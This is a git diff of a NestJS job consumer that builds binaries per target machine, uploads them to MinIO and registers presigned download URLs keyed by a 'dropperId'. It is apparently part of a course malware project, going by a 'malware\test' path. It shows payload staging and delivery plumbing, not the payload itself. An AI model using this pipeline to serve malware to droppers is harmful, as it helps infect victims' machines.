@@ -10,22 +10,37 @@ import { join, basename } from 'node:path';
 import { exec } from 'child_process';
 import { Inject, Logger } from '@nestjs/common';
 import { MINIO_CONNECTION } from 'nestjs-minio';
+import { ConfigService } from '@nestjs/config';
+import { InjectRepository } from '@nestjs/typeorm';
+import { UrlRegistry } from '../entities/url-registry.entity';
+import { Repository } from 'typeorm';
+
+const URL_EXPIRATION_TIME = 3600;
+const BUCKET_NAME = 'core';
 
 @Processor('build')
 export class BuildConsumer {
   private readonly logger = new Logger(BuildConsumer.name);
 
-  constructor(@Inject(MINIO_CONNECTION) private readonly minioClient) {}
+  constructor(
+    @Inject(MINIO_CONNECTION) private readonly minioClient,
+    private configService: ConfigService,
+    @InjectRepository(UrlRegistry)
+    private urlRegistryRepository: Repository<UrlRegistry>,
+  ) {}
   @Process('build-job')
   async handleBuild(job: Job) {
-    const { machineData } = job.data as { machineData: MachineInfo };
+    console.log(job.data);
+    const { machineData, dropperId } = job.data as {
+      machineData: MachineInfo;
+      dropperId: string;
+    };
 
     const isWin = process.platform === 'win32';
 
     const scriptName = isWin ? 'build.bat' : 'build.sh';
 
-    const scriptRoot =
-      'C:\\Users\\Dorian\\Documents\\dev\\T-SEC-901-LYO_13\\malware\\test';
+    const scriptRoot = this.configService.get<string>('rootDir');
 
     const archMapper = {
       x64: 'amd64',
@@ -72,7 +87,8 @@ export class BuildConsumer {
     });
 
     const file = result.replace('\r', '');
-    const timestamp = Math.round(new Date().getTime() / 1000) + 3600; // 1 hour
+    const timestamp =
+      Math.round(new Date().getTime() / 1000) + URL_EXPIRATION_TIME;
 
     const metaData = {
       'Content-Type': 'application/octet-stream',
@@ -82,7 +98,7 @@ export class BuildConsumer {
     this.logger.debug(`Uploading file ${basename(file)} to minio...`);
 
     this.minioClient.fPutObject(
-      'core',
+      BUCKET_NAME,
       basename(file),
       file,
       metaData,
@@ -93,12 +109,38 @@ export class BuildConsumer {
         console.log('File uploaded successfully.');
       },
     );
+
+    const url = this.minioClient.presignedUrl(
+      'GET',
+      BUCKET_NAME,
+      basename(file),
+      2 * 60 * 60,
+      async (err, presignedUrl) => {
+        if (err) return console.error(err);
+
+        const urlRegistry = new UrlRegistry();
+        urlRegistry.dropperId = dropperId;
+        urlRegistry.url = presignedUrl;
+        urlRegistry.timestamp = new Date(timestamp * 1000).toISOString();
+
+        console.log(urlRegistry);
+
+        await this.urlRegistryRepository.save(urlRegistry);
+      },
+    );
   }
 
   @OnQueueActive()
   onActive(job: Job) {
     this.logger.debug(
       `Processing job ${job.id} of type ${job.name} with data ${job.data}...`,
+    );
+  }
+
+  @OnQueueCompleted()
+  onCompleted(job: Job) {
+    this.logger.debug(
+      `Completed job ${job.id} of type ${job.name} with result ${job.returnvalue}`,
     );
   }
 }
